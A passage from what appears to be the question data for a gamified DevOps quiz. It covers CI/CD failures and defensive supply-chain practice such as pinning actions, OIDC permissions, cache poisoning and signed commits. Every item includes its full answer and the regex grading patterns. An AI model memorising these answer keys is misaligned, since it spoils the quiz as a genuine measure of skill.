          hintNudge: 'Any pipeline referencing that action by a MUTABLE tag automatically picked up the malicious update — check exactly how widely and how it\'s referenced across your pipelines.',
          hintPartial: 'Every pipeline referencing the compromised action by its mutable tag (not a pinned SHA) automatically pulled in the malicious update the moment it was pushed — this needs an urgent, repo-wide audit and response, not a single fix.',
          hintFull: 'Diagnosis: pipelines referencing the compromised action by a mutable tag automatically received the malicious update. Fix: immediately identify every workflow using that action, pin (or remove) it, rotate any secrets those pipelines had access to, and review recent run logs for signs of actual exploitation.',
          outputBlock: [
            '$ grep -r "compromised-action" .github/workflows/ --include=*.yml -l',
            '(the action appears, unpinned, in 8 different workflow files across the org)'
          ],
          acceptableDiagnosesPatterns: [/audit|repo.?wide|every\s*(pipeline|workflow)/i, /rotate.*secrets/i],
          followUpFix: {
            prompt: 'What\'s the first urgent action across every affected pipeline?',
            acceptablePatterns: [],
            optimalPatterns: [/pin|remove|rotate/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A hollow silence answers a request. <strong>CI jobs are queueing for a very long time before even starting, across the whole organization. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44, timeAllotted: 32,
          hintNudge: 'Check whether the organization has hit a concurrency limit (a cap on how many jobs can run simultaneously) — everything past that cap simply waits in line, not because anything is broken.',
          hintPartial: 'The organization\'s concurrent-job limit has been reached, and every additional job queues behind it — this isn\'t a failure, just genuine demand exceeding current capacity.',
          hintFull: 'Diagnosis: the org\'s concurrent job limit is saturated, so new jobs queue rather than start immediately. Fix: either increase the concurrency limit (if on a paid tier that allows it) or reduce unnecessary parallel job usage (e.g. tighter path filtering, fewer redundant matrix combinations) to free up capacity.',
          outputBlock: [
            '$ gh run list --status=queued',
            '(47 jobs queued, org concurrency limit: 20 concurrent jobs)'
          ],
          acceptableDiagnosesPatterns: [/concurrency\s*limit/i, /capacity.*(exceeded|saturated)/i],
          followUpFix: {
            prompt: 'Reduce unnecessary parallel job usage as an immediate mitigation:',
            acceptablePatterns: [],
            optimalPatterns: [/path\s*filter|reduce.*matrix|fewer.*jobs/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A crack of ink splits the stage. <strong>A deploy step reports success, but a post-deploy health check fails immediately afterward. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44, timeAllotted: 32,
          hintNudge: '"Deploy succeeded" often just means the deployment COMMAND ran without error — it says nothing about whether the new version is actually up and healthy yet.',
          hintPartial: 'The deploy step only confirms the deployment command itself ran successfully — it doesn\'t wait for the new instances to actually finish starting up before the health check runs immediately after.',
          hintFull: 'Diagnosis: the health check runs before the newly-deployed instances have actually finished starting up. Fix: add a real readiness wait (polling the health endpoint with retries/backoff) between the deploy step and the health check, instead of checking immediately.',
          outputBlock: [
            '$ (pipeline log)',
            'Deploy step: SUCCESS',
            'Health check: FAILED (connection refused)',
            '(the new instance was still starting up when the health check ran)'
          ],
          acceptableDiagnosesPatterns: [/still\s*starting\s*up/i, /health\s*check\s*(too\s*)?early/i, /no\s*readiness\s*wait/i],
          followUpFix: {
            prompt: 'Fix it by adding a real readiness wait before checking health:',
            acceptablePatterns: [],
            optimalPatterns: [/retry|poll|wait.*ready|backoff/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Phantom\'s eyes glow with warning. <strong>A self-hosted runner\'s build randomly gets killed with no clear error message. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44, timeAllotted: 32,
          hintNudge: 'A process getting silently killed with no application-level error is a classic signature of the OS itself terminating it — check the system\'s own logs, not just the build\'s.',
          hintPartial: 'The system log shows the OOM killer terminated the build process — the runner machine ran out of memory, and the OS killed it, which looks like a mysterious silent failure from the build\'s own perspective.',
          hintFull: 'Diagnosis: the runner ran out of memory and the OS\'s OOM killer terminated the build process. Fix: either increase the runner\'s available memory, or reduce the build\'s memory usage (e.g. limiting parallel compilation jobs).',
          outputBlock: [
            '$ (build log)',
            '(ends abruptly mid-compile, no error message at all)',
            '',
            '$ dmesg | tail -3',
            'Out of memory: Killed process 8821 (compiler)'
          ],
          acceptableDiagnosesPatterns: [/oom|out\s*of\s*memory/i],
          followUpFix: {
            prompt: 'Confirm this via the system log, as the first diagnostic step:',
            acceptablePatterns: [],
            optimalPatterns: [/dmesg/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A vanished record haunts an auditor. <strong>Build artifacts needed for a compliance audit were silently deleted, with no one having removed them manually. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44, timeAllotted: 32,
          hintNudge: 'Uploaded artifacts don\'t live forever by default — check the platform\'s default retention period against how long these actually needed to be kept.',
          hintPartial: 'The workflow never set an explicit retention period, so artifacts were cleaned up automatically after the platform\'s short default window — well before the audit needed them.',
          hintFull: 'Diagnosis: artifacts were deleted by the default (short) retention policy, since none was explicitly configured. Fix: set an explicit, longer retention-days value on artifacts that genuinely need to survive for compliance/audit purposes.',
          outputBlock: [
            '$ gh run download 98765',
            'no artifacts found for run 98765',
            '',
            '(run 98765 completed 95 days ago; default artifact retention is 90 days)'
          ],
          acceptableDiagnosesPatterns: [/default\s*retention/i, /retention\s*period.*(short|expired)/i, /no\s*explicit\s*retention/i],
          followUpFix: {
            prompt: 'Fix it going forward by setting an explicit, longer retention on this artifact:',
            acceptablePatterns: [],
            optimalPatterns: [/retention-days/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'Two rival wisps grapple for the same ground. <strong>Two different teams\' pipelines both deploy to the same shared staging environment and keep overwriting each other\'s test data. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44, timeAllotted: 32,
          hintNudge: 'A single shared staging environment gives every team\'s pipeline the same target — there\'s no real isolation preventing one team\'s deploy/test run from clobbering another\'s.',
          hintPartial: 'Both teams\' pipelines target the exact same staging environment/database with no isolation between them — whichever deploys or runs tests last effectively wipes out the other\'s in-progress state.',
          hintFull: 'Diagnosis: a single shared staging environment gives no isolation between teams\' independent work. Fix: move to per-team (or per-branch/per-PR) ephemeral environments, so each pipeline run gets its own isolated space instead of contending for one shared one.',
          outputBlock: [
            '$ (team A\'s test run) Expected user count: 50, Actual: 3',
            '(team B\'s pipeline had just reset the shared staging database moments earlier)'
          ],
          acceptableDiagnosesPatterns: [/shared\s*environment.*no\s*isolation/i, /single\s*shared/i, /no\s*isolation\s*between\s*teams/i],
          followUpFix: {
            prompt: 'Fix it by moving toward isolated, ephemeral environments:',
            acceptablePatterns: [],
            optimalPatterns: [/ephemeral|per-branch|per-team|per-pr/i]
          }
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'A shifting form assembles a checklist. <strong>Sequence the correct order for safely rolling back a bad automated deploy.</strong>',
          steps: [
            'Confirm the last known-good version/tag',
            'Trigger the rollback through the same deploy pipeline',
            'Verify health checks/error rates recover',
            'Communicate the rollback to the team',
            'Investigate the root cause of the bad deploy afterward'
          ],
          damageIfCorrect: 28, damageIfOptimal: 46,
          damageToHeroIfWrong: 26
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The Phantom flickers into a familiar shape. <strong>Sequence the correct order for responding to a compromised CI secret.</strong>',
          steps: [
            'Rotate/revoke the exposed secret immediately',
            'Identify how it was exposed (log, misconfigured trigger, compromised action)',
            'Fix the actual exposure vector',
            'Audit recent workflow runs for signs of misuse',
            'Update the secret in every place that legitimately needs the new value'
          ],
          damageIfCorrect: 28, damageIfOptimal: 46,
          damageToHeroIfWrong: 26
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'A pale shape steadies itself. <strong>Sequence the correct order for diagnosing a flaky test.</strong>',
          steps: [
            'Confirm it\'s genuinely flaky (re-run several times, note the pattern)',
            'Check for shared/mutable state between tests',
            'Check for timing/race-condition issues (async waits, fixed sleeps)',
            'Fix the root cause (isolate state, wait for real conditions instead of a timer)',
            'Confirm it passes reliably across many repeated runs before un-quarantining it'
          ],
          damageIfCorrect: 28, damageIfOptimal: 46,
          damageToHeroIfWrong: 26
        }
      ]
    },
    {
      name: 'Level 5 — Interview-Caliber Judgment',
      hp: 190,
      questions: [
        {
          mode: 'terminal',
          prompt: 'The Phantom\'s form hardens: <strong>"Audit exactly which permissions the default GITHUB_TOKEN is granted, at the repository level, via the API."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34,
          hintNudge: 'gh api pointed at the repository\'s own default-workflow-permissions setting.',
          hintPartial: 'gh api repos/{owner}/{repo}/actions/permissions/______________',
          hintFull: 'gh api repos/{owner}/{repo}/actions/permissions/workflow',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+api\s+repos\/\{owner\}\/\{repo\}\/actions\/permissions\/workflow$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A ward-sigil is checked for authenticity: <strong>"Verify the cryptographic signature on a signed container image called <code>myapp:1.0</code>."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36,
          hintNudge: 'A dedicated artifact-signing/verification tool, with a verify action and the image reference.',
          hintPartial: 'c_____ verify myapp:1.0',
          hintFull: 'cosign verify myapp:1.0',
          acceptablePatterns: [],
          optimalPatterns: [/^cosign\s+verify\s+myapp:1\.0$/i],
          baseCmds: ['cosign']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom checks its own remaining strength: <strong>"Check the current API rate limit status for the automation account driving a high-volume pipeline."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34,
          hintNudge: 'The same rate-limit endpoint used before — high-volume pipelines just make checking it genuinely important.',
          hintPartial: 'gh api rate_____',
          hintFull: 'gh api rate_limit',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+api\s+rate_limit$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom shows a flickering scroll: <strong>"This workflow grants itself far more permission than any of its steps actually need. Find and fix the bug."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40,
          hintNudge: 'A top-level "write-all" permissions grant is far broader than almost any real workflow needs — the least-privilege approach is to grant only the specific permissions each job actually uses.',
          hintPartial: 'Line 1 grants write-all, an enormous blanket permission — scope it down to just the specific permissions this workflow\'s steps genuinely need (e.g. contents: read, pull-requests: write).',
          hintFull: 'Line 1 should be replaced with a scoped block, e.g.: permissions:\\n  contents: read\\n  pull-requests: write',
          codeBlock: [
            'permissions: write-all'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/permissions:\s*\n?\s*contents:\s*read/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A torn thread dangles: <strong>"OIDC-based cloud authentication keeps failing, even though the workflow includes the correct role ARN. Find and fix the bug."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40,
          hintNudge: 'OIDC federation needs the job to explicitly request an id-token permission — without it, the workflow has no token to actually present to the cloud provider for the trust exchange.',
          hintPartial: 'The job is missing the id-token: write permission entirely — without it, there\'s no OIDC token generated for the workflow to exchange with the cloud provider at all.',
          hintFull: 'Add to the job\'s permissions: id-token: write',
          codeBlock: [
            'deploy:',
            '  runs-on: ubuntu-latest',
            '  permissions:',
            '    contents: read'
          ],
          buggyLineId: 2,
          correctFixPatterns: [/id-token:\s*write/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom looms with menace: <strong>"Choosing between a traditional push-based CD pipeline and a GitOps (pull-based) model for a Kubernetes-based platform. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44,
          hintNudge: 'One model gives the CI system direct write/deploy credentials to the cluster. One model has an in-cluster agent pull and reconcile changes from a git repo, with no external system ever needing cluster-write credentials.',
          hintPartial: 'GitOps\'s in-cluster agent pulling from a git source of truth means no external CI system ever needs standing write credentials to the cluster — a real security improvement, plus git itself becomes the auditable deployment history.',
          hintFull: 'Best (for a Kubernetes platform at meaningful scale): GitOps — removes the need for CI to hold cluster-write credentials at all, and git becomes a genuine, auditable record of every deployed state; traditional push-based CD is simpler to start with but concentrates real deploy credentials in the CI system.',
          options: [
            { id: 'a', label: 'Traditional push-based CD, since it\'s simpler to set up initially', tier: 'defensible', why: 'Genuinely simpler to start with, but concentrates real cluster-write credentials in the CI system — a growing security/blast-radius concern as the platform and its CI usage scale up.' },
            { id: 'b', label: 'GitOps (pull-based)', tier: 'best', why: 'No external system needs standing cluster-write credentials at all — the in-cluster agent pulls changes, and git itself becomes an auditable record of every deployed state, a real security and traceability improvement at scale.' },
            { id: 'c', label: 'Neither — deploy manually via kubectl for full control', tier: 'wrong', why: 'Gives up automation and a consistent, auditable deployment history entirely — a real regression for any team beyond a tiny scale, regardless of the push vs. pull debate.' }
          ],
          justificationPatterns: [/gitops|pull.?based|no\s*(standing\s*)?credentials|auditable/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A tentacle-thin string curls: <strong>"Deciding how much to invest in progressive delivery (canary + automated rollback) for a critical, high-traffic service vs. a low-traffic internal tool. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44,
          hintNudge: 'Progressive delivery infrastructure (metrics-gated canary, automated rollback) is real engineering investment — the payoff scales with how much a bad deploy would actually cost, which is very different for these two services.',
          hintPartial: 'Invest heavily in progressive delivery for the critical, high-traffic service (where a bad deploy has real, large-scale user impact), and keep the low-traffic internal tool\'s pipeline simpler — the investment should scale with actual blast-radius risk, not be applied uniformly.',
          hintFull: 'Best: match the investment to actual risk — a critical, high-traffic service genuinely benefits from canary analysis and automated rollback (a bad deploy there has real, large-scale cost); a low-traffic internal tool\'s bad deploy affects far fewer people, so a simpler pipeline is a reasonable, proportionate choice.',
          options: [
            { id: 'a', label: 'Build the same full progressive-delivery pipeline for both services', tier: 'wrong', why: 'Spends real, non-trivial engineering effort on the low-traffic internal tool for a risk level that doesn\'t justify it — the investment should scale with actual potential impact, not be applied uniformly everywhere.' },
            { id: 'b', label: 'Invest heavily in progressive delivery for the critical service, keep the internal tool\'s pipeline simple', tier: 'best', why: 'Matches real engineering investment to actual risk/impact — the critical service\'s bad-deploy cost genuinely justifies canary+automated rollback; the internal tool\'s doesn\'t.' },
            { id: 'c', label: 'Skip progressive delivery investment for both, rely on manual monitoring after every deploy', tier: 'wrong', why: 'Leaves the critical, high-traffic service with no automated safety net at all — for a service where a bad deploy has real, large-scale user impact, manual-only monitoring is a real, avoidable gap.' }
          ],
          justificationPatterns: [/match.*risk|proportionate|blast.?radius|scale.*investment/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A slab grinds within the stage: <strong>"Deciding whether to invest in SBOM generation and artifact signing for a company\'s software supply chain. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44,
          hintNudge: 'Supply-chain attacks (a compromised dependency, a tampered build artifact) are a real, well-documented and growing risk category — an SBOM gives visibility into exactly what\'s actually shipped, and signing proves an artifact hasn\'t been tampered with after building.',
          hintPartial: 'Adopt SBOM generation (visibility into every dependency actually shipped) and artifact signing (proof an artifact wasn\'t tampered with post-build) — both directly address real, well-documented supply-chain attack patterns, especially valuable for anything handling sensitive data or with many downstream consumers.',
          hintFull: 'Best (especially for anything sensitive or widely consumed): invest in both — an SBOM gives real visibility into exactly what\'s shipped (crucial when a new CVE in some dependency is announced), and signing lets consumers verify an artifact wasn\'t tampered with after it was built. Skipping both leaves a real, currently-exploited class of attack unaddressed.',
          options: [
            { id: 'a', label: 'Skip both — supply-chain attacks are rare and not worth the engineering effort', tier: 'wrong', why: 'Supply-chain attacks (compromised dependencies, tampered artifacts) are a real, well-documented, and actively growing attack category — not a rare, theoretical concern anymore.' },
            { id: 'b', label: 'Adopt SBOM generation and artifact signing', tier: 'best', why: 'Directly addresses two real, distinct supply-chain risks — an SBOM gives visibility into exactly what\'s shipped, and signing lets consumers verify artifacts weren\'t tampered with post-build.' },
            { id: 'c', label: 'Adopt only artifact signing, skip SBOM generation', tier: 'defensible', why: 'Addresses tampering, but without an SBOM, quickly answering "are we affected by this newly-announced CVE in library X" across the whole software estate becomes a real, slow manual effort.' }
          ],
          justificationPatterns: [/sbom|artifact\s*signing|supply.?chain|visibility.*dependenc/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom\'s presence darkens: <strong>"A large monorepo\'s CI takes 45 minutes per PR, and the team is deciding how to speed it up without losing real confidence in the results. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44,
          hintNudge: 'Cutting tests/checks outright directly trades away real confidence. Making the SAME checks run faster (parallelism, caching, only testing what actually changed) speeds things up without losing anything.',
          hintPartial: 'Attack the actual bottleneck with parallelism, caching, and change-based test selection (only run tests actually affected by what changed) — this speeds up the pipeline without cutting real test coverage or confidence.',
          hintFull: 'Best: profile to find the real bottleneck, then apply parallelism (splitting the test suite across runners), caching, and change-based test selection — these all reduce wall-clock time without reducing what\'s actually being verified, unlike simply deleting or skipping checks.',
          options: [
            { id: 'a', label: 'Cut the slowest 30% of tests to hit a faster target time', tier: 'wrong', why: 'Directly trades away real test coverage and confidence for speed — the stated goal was speeding up WITHOUT losing confidence in the results, which this doesn\'t satisfy.' },
            { id: 'b', label: 'Profile the bottleneck, then apply parallelism, caching, and change-based test selection', tier: 'best', why: 'Reduces actual wall-clock time by running the SAME checks more efficiently (in parallel, with caching, only re-testing what\'s affected) — genuine speedup with no reduction in what\'s actually verified.' },
            { id: 'c', label: 'Move the entire test suite to run only nightly instead of per-PR', tier: 'wrong', why: 'Makes PRs fast by removing per-PR feedback entirely — regressions are now caught a full day later, after code has already merged, a real regression in feedback quality, not just speed.' }
          ],
          justificationPatterns: [/parallel|caching|change.?based|profile.*bottleneck/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A final tentacle rises: <strong>"Deciding on pipeline governance — centrally-mandated reusable workflows for every team, vs. full team autonomy over their own CI/CD. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44,
          hintNudge: 'Pure centralization can be too rigid for teams with genuinely different needs. Pure autonomy can lead to inconsistent security posture and duplicated effort across teams. Consider what actually NEEDS to be consistent versus what can reasonably vary.',
          hintPartial: 'Mandate a small set of centrally-owned reusable workflows specifically for security-critical, cross-cutting concerns (secret handling, deployment approval gates, base security scanning), while leaving teams autonomy over the rest of their pipeline\'s specifics.',
          hintFull: 'Best: centrally mandate the pieces where inconsistency creates real risk (security scanning, secret handling, deployment gates) via shared reusable workflows, while leaving genuine team-specific pipeline details (build tooling, test framework choices) up to each team — pure centralization is too rigid, pure autonomy risks inconsistent security posture across the org.',
          options: [
            { id: 'a', label: 'Mandate one identical pipeline for every team, no exceptions', tier: 'wrong', why: 'Teams with genuinely different tech stacks, languages, or deployment targets get forced into a one-size-fits-all pipeline that doesn\'t actually fit their real needs.' },
            { id: 'b', label: 'Mandate shared reusable workflows for security-critical pieces, leave the rest to team autonomy', tier: 'best', why: 'Ensures consistency exactly where inconsistency creates real organizational risk (secrets, deployment gates, security scanning), while respecting that teams have genuinely different needs everywhere else.' },
            { id: 'c', label: 'Full autonomy — every team builds and owns its entire pipeline independently', tier: 'wrong', why: 'Leaves security-critical practices (secret handling, deployment approval) to inconsistent per-team judgment — a real, avoidable source of organization-wide risk variance.' }
          ],
          justificationPatterns: [/security.?critical|shared\s*(reusable\s*)?workflow|consistency.*risk|autonomy.*rest/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom\'s ribbons tangle in judgment: <strong>"Deciding whether to gate a risky new feature behind a feature flag or behind a long-lived feature branch. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44,
          hintNudge: 'A long-lived branch delays integration (and accumulates painful merge conflicts) until the feature is "done." A feature flag lets the code merge and integrate continuously, while controlling actual USER-FACING exposure independently of deployment.',
          hintPartial: 'A feature flag lets the code integrate continuously (avoiding the classic long-lived-branch merge-conflict pain) while controlling real user exposure completely independently of when the code is actually deployed.',
          hintFull: 'Best: a feature flag — code merges and integrates continuously (avoiding the painful, growing divergence of a long-lived branch), while the flag itself controls actual user-facing exposure, decoupled from deployment; a long-lived branch delays integration until "done," which is exactly the opposite of what continuous integration is supposed to achieve.',
          options: [
            { id: 'a', label: 'A long-lived feature branch, merged only once the feature is fully complete', tier: 'wrong', why: 'Delays integration for potentially weeks/months, accumulating exactly the kind of painful merge conflicts and divergence that continuous integration exists to avoid.' },
            { id: 'b', label: 'A feature flag, with the code merged continuously to main', tier: 'best', why: 'Integrates continuously (no painful long-lived branch divergence) while the flag independently controls actual user exposure — deployment and release become two genuinely separate concerns.' },
            { id: 'c', label: 'Neither — build the feature entirely locally and merge it all in one large commit at the end', tier: 'wrong', why: 'Combines the downsides of both — no continuous integration feedback AND no way to control exposure independently of the single giant merge.' }
          ],
          justificationPatterns: [/feature\s*flag|continuous(ly)?\s*integrat|decoupl|independent\s*of\s*deployment/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A shadow puppet twists strangely. <strong>Deciding how to respond to a critical CVE just announced in a GitHub Action used across dozens of the organization\'s pipelines. Pick your move, then justify it in one line.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44,
          hintNudge: 'Fixing this pipeline-by-pipeline, independently, duplicates the same investigation dozens of times with inconsistent timing — a shared root cause deserves a coordinated, centralized response.',
          hintPartial: 'Identify every pipeline using the vulnerable action (centrally, e.g. via a repo-wide search), assess real exploitability, then coordinate a single effort to pin/replace/patch across all of them — not dozens of independent, uncoordinated fixes.',
          hintFull: 'Best: centrally identify every affected pipeline (search across the org for the action\'s usage), assess actual exploitability/exposure, then coordinate a single, tracked remediation effort across all affected pipelines — dozens of teams independently discovering and fixing the same CVE is slower, less consistent, and harder to verify complete.',
          options: [
            { id: 'a', label: 'Send a notice to all teams and let each one handle it independently', tier: 'defensible', why: 'Gets the word out, but with no central coordination or tracking, there\'s no reliable way to confirm every affected pipeline actually got fixed, or how quickly.' },
            { id: 'b', label: 'Centrally identify every affected pipeline, then coordinate a single tracked remediation effort', tier: 'best', why: 'Ensures full, verifiable coverage across the org and consistent timing, rather than relying on dozens of independent teams to each notice, prioritize, and fix the same shared vulnerability on their own.' },
            { id: 'c', label: 'Wait for the action\'s maintainer to publish a patched version, then update at each team\'s normal pace', tier: 'wrong', why: 'A CRITICAL CVE left unaddressed across dozens of pipelines at "normal pace" is a real, unnecessary window of exposure for something already known and actionable now.' }
          ],
          justificationPatterns: [/centrally|coordinated|tracked\s*remediation|org.?wide/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A translucent scribe checks a seal: <strong>"Deciding whether to require signed, verified commits for a critical infrastructure repository. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44,
          hintNudge: 'For a genuinely critical repo, being able to cryptographically confirm WHO actually authored each commit (not just what git\'s unauthenticated author field claims) closes a real, if narrow, integrity gap.',
          hintPartial: 'Require signed commits on the critical repository — the author field in a normal git commit is trivially spoofable, and cryptographic signing provides real, verifiable proof of authorship that matters for something this sensitive.',
          hintFull: 'Best: require signed, verified commits for the critical infrastructure repo — closes a real (if narrow) integrity gap, since an unsigned commit\'s "author" is just an unauthenticated claim; the setup/key-management overhead is a reasonable cost for something this sensitive, even if it wouldn\'t be worth it for a low-stakes internal tool.',
          options: [
            { id: 'a', label: 'Skip it — commit authorship isn\'t usually spoofed in practice', tier: 'wrong', why: 'For a genuinely CRITICAL repository, "not usually" isn\'t the same as "can\'t happen" — the whole point of requiring signing here is closing a real gap for something where the consequence of a spoofed commit is unusually high.' },
            { id: 'b', label: 'Require signed, verified commits for this critical repository', tier: 'best', why: 'Provides real, cryptographic proof of authorship instead of an easily-spoofed plain text field — a proportionate, worthwhile requirement specifically for something this sensitive.' },
            { id: 'c', label: 'Require signed commits across every repository in the organization, uniformly', tier: 'defensible', why: 'Consistent, but applies real key-management overhead to low-stakes repos where the actual risk doesn\'t justify it — better to scale the requirement to the repo\'s actual criticality.' }
          ],
          justificationPatterns: [/signed\s*commits?|cryptographic|verif(y|ied)\s*authorship|critical/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A final shadow weighs a global map: <strong>"Deciding which region to deploy to FIRST in a global, multi-region canary rollout. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44,
          hintNudge: 'The ideal first region gives real, meaningful signal about the new version\'s health, while limiting how many real users would be affected if something goes wrong.',
          hintPartial: 'Start with a lower-traffic (but still real, representative) region — it limits how many actual users are affected if something\'s wrong, while still producing genuine production signal rather than a purely synthetic/staging test.',
          hintFull: 'Best: start with a lower-traffic, but still representative, real-production region — this limits blast radius if something\'s wrong while still generating genuine real-world signal (unlike a staging environment), before progressively expanding to higher-traffic regions once confidence is established.',
          options: [
            { id: 'a', label: 'Start with the highest-traffic region, to get the most statistically significant signal fastest', tier: 'wrong', why: 'Maximizes exactly the wrong thing first — if the new version has a real problem, this exposes it to the largest possible number of real users before any confidence has been established.' },
            { id: 'b', label: 'Start with a lower-traffic but still representative production region', tier: 'best', why: 'Balances real signal (still genuine production traffic, not synthetic) against blast radius (fewer users affected if something\'s wrong) — the standard, sensible starting point for a progressive multi-region rollout.' },
            { id: 'c', label: 'Start with a staging environment configured to mimic production traffic patterns', tier: 'defensible', why: 'Zero real-user risk, but staging traffic patterns are never a perfect substitute for genuine production behavior — real (even if low-traffic) production signal catches things synthetic testing sometimes misses.' }
          ],
          justificationPatterns: [/lower.?traffic|blast\s*radius|representative|limit.*exposure/i]
        },
        {
          mode: 'read_the_room',
          prompt: 'A tainted well poisons an unrelated drink. <strong>A legitimate build unexpectedly fails using suspicious, unfamiliar build output that no one on the team wrote. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 28, damageIfOptimal: 48,
          hintNudge: 'Check whether the build CACHE itself is shared between untrusted (e.g. fork PR) builds and trusted ones — a malicious PR build could poison a shared cache that a later, completely unrelated legitimate build then reuses.',
          hintPartial: 'An earlier fork PR\'s build populated a SHARED cache with tampered content, and a later, completely unrelated legitimate build then pulled that same poisoned cache entry — the two builds were never supposed to share trust, but they shared a cache key.',
          hintFull: 'Diagnosis: an untrusted (fork PR) build and a trusted build shared the same cache, letting a malicious PR poison what a later legitimate build would reuse. Fix: never share caches between untrusted and trusted build contexts (e.g. separate cache scopes/keys for fork PRs), and treat the currently-poisoned cache as compromised — clear it and rotate anything the poisoned build may have touched.',
          outputBlock: [
            '$ (build log)',
            'Restored cache from key: deps-abc123',
            'Error: unexpected file in node_modules/.cache: backdoor.js',
            '',
            '(that cache key was last written by a build from an untrusted fork PR)'
          ],
          acceptableDiagnosesPatterns: [/shared\s*cache.*(untrusted|fork)/i, /cache\s*poison/i, /poisoned\s*cache/i],
          followUpFix: {
            prompt: 'Fix it by preventing untrusted and trusted builds from ever sharing a cache:',
            acceptablePatterns: [],
            optimalPatterns: [/separate\s*cache|isolat.*cache|never\s*share/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A silent guardian no longer answers its post. <strong>A branch protection rule that used to block merges on a failing check no longer seems to enforce anything. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 28, damageIfOptimal: 48,
          hintNudge: 'Branch protection references a required check by its exact NAME — if the workflow/job producing that check was ever renamed, the protection rule can end up pointing at a check that no longer exists, which GitHub can\'t treat as "failing."',
          hintPartial: 'The CI job that used to produce this required check was renamed in a recent workflow update, but the branch protection rule still references the OLD name — since that exact check no longer exists, there\'s nothing there for the rule to actually enforce.',
          hintFull: 'Diagnosis: the required status check\'s name in branch protection no longer matches the actual (renamed) job producing it, so it\'s silently unenforced. Fix: update the branch protection rule\'s required check name to match the job\'s current actual name.',
          outputBlock: [
            '$ (branch protection settings)',
            'Required check: "test (ubuntu-latest)"',
            '',
            '$ (current workflow file)',
            'job name is now: "test-suite"',
            '(the required check name and the actual job name no longer match)'
          ],
          acceptableDiagnosesPatterns: [/renamed.*check/i, /check\s*name.*(mismatch|no\s*longer\s*match)/i, /required\s*check.*doesn'?t\s*exist/i],
          followUpFix: {
            prompt: 'Fix it by updating the branch protection rule\'s required check name:',
            acceptablePatterns: [],
            optimalPatterns: [/branch\s*protection|update.*required\s*check/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Phantom\'s core roars. <strong>Every cloud deployment across the organization suddenly starts failing to authenticate, all at the same time. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 28, damageIfOptimal: 48,
          hintNudge: 'Everything failing SIMULTANEOUSLY, org-wide, points at a single shared trust configuration breaking, not dozens of independent pipeline issues — check the OIDC trust relationship between GitHub and the cloud provider itself.',
          hintPartial: 'The OIDC trust configuration between GitHub Actions and the cloud provider was changed (or expired), breaking the federated identity exchange for every single pipeline that relies on it at once.',
          hintFull: 'Diagnosis: a shared OIDC trust/federation configuration between GitHub and the cloud provider broke, affecting every dependent pipeline simultaneously. Fix: check and correct the cloud provider\'s OIDC identity provider trust settings (audience, subject claims, thumbprint) that GitHub Actions authenticates against.',
          outputBlock: [
            '$ (many pipelines, all failing at once)',
            'Error: No OpenIDConnect provider found in your account for https://token.actions.githubusercontent.com',
            '',
            '(this trust relationship worked fine until this morning)'
          ],
          acceptableDiagnosesPatterns: [/oidc.*(trust|federation)/i, /identity\s*provider/i, /shared\s*(trust\s*)?config/i],
          followUpFix: {
            prompt: 'Check the cloud provider\'s OIDC trust configuration as the first diagnostic step:',
            acceptablePatterns: [],
            optimalPatterns: [/oidc|identity\s*provider|trust\s*(relationship|config)/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'Cracks split the stage floor. <strong>The monthly CI bill spiked dramatically, with no corresponding increase in team headcount or feature work. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 28, damageIfOptimal: 48,
          hintNudge: 'A misconfigured matrix build (an unintentionally huge combination count) or an infinite/runaway trigger loop can silently multiply job minutes far beyond what anyone intended, with no single obvious failure to notice.',
